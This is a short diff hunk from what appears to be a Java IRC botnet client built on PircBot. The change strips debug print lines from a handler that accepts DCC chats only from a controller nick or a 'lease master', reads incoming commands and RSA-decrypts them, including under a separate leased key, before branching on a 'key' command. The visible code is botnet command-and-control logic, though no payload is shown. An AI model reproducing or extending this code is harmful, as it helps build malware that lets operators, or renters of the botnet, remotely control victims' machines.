@@ -269,16 +269,10 @@ public class BotnetClient extends PircBot {
 				if (!chat.getNick().equalsIgnoreCase(CC) && !chat.getNick().equalsIgnoreCase(leaseMaster)) {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else { 
-					System.out.println("chat about to be accepted");
 					chat.accept();
-					System.out.println("chat accepted");
 					String command = chat.readLine();
-					System.out.println("read line");
 					String commandRSA = m.decryptRSA(command);
 					String leasedCommandRSA = leasedM.decryptRSA(command);
-					System.out.println("c: " + command);
-					System.out.println("m1: " + commandRSA);
-					System.out.println("m2: " + leasedCommandRSA);
 					if (commandRSA.startsWith("key")) {
 						String otherKey = m.decryptRSA(chat.readLine());
 						String info = m.decryptRSA(chat.readLine());
